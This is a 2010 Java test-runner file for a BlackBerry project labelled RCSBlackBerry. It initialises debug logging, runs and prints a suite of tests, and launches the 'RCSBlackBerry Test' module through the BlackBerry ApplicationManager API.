/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests
 * File         : MainTest.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.ApplicationManagerException;
import net.rim.device.api.system.CodeModuleManager;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/*
 * BlackBerry applications that provide a user interface
 * must extend UiApplication.
 */
/**
 * The Class MainTest.
 */
public final class MainTest {
    // #debug
    static Debug debug = new Debug("Main", DebugLevel.VERBOSE);

    /**
     * Instantiates a new main test.
     */
    public MainTest() {

        final boolean logToDebugger = true;
        final boolean logToFlash = false;
       final boolean logToSD = false;
        final boolean logToEvents = false;

        Utils.sleep(2000);
        // #mdebug
        Debug.init(logToDebugger, logToSD, logToFlash, logToEvents);
        debug.trace("Test Init");
        // #enddebug

        // create a new instance of the application

        // #debug info        
        debug.info("--- Starting Main ---");

        executeAll();
    }

    /**
     * Execute all.
     */
    public void executeAll() {

        // Per ogni test presente, lo esegue e aggiunge il risultato
        final Tests test = Tests.getInstance();

        for (int i = 0; i < test.getCount(); i++) {
            test.execute(i);
        }

        System.out.println("EXECUTE ALL");
        System.out.println("--------------------------------");
        for (int i = 0; i < test.getCount(); i++) {
            final String result = test.result(i);

            System.out.println(result);
        }
        System.out.println("--------------------------------");

    }

    /**
     * Execute application.
     * 
     * @param appname
     *            the appname
     */
    public void ExecuteApplication(final String appname) {
        System.out.println("RCSBlackBerry Test launching");
        final int handle = CodeModuleManager
                .getModuleHandle("RCSBlackBerry Test");
        final ApplicationDescriptor[] descriptors = CodeModuleManager
                .getApplicationDescriptors(handle);
        if (descriptors.length > 0) {
            final ApplicationDescriptor descriptor = descriptors[0];
            try {
                final ApplicationManager manager = ApplicationManager
                        .getApplicationManager();
                while (manager.inStartup()) {
                    try {
                        Thread.sleep(1000);
                    } catch (final InterruptedException e) {
                        //#debug error
                        debug.error("ExecuteApplication: " + e);
                    }
                }
                manager.runApplication(descriptor);
            } catch (final ApplicationManagerException e) {
                System.out.println("I couldn't launch it!");
                e.printStackTrace();
            } catch (final Exception e) {
                System.out.println("Exception: " + e);
                e.printStackTrace();
            }
        } else {
            System.out.println("RCSBlackBerry Test is not installed.");
        }

        System.out.println("Goodbye, world!");
    }
}
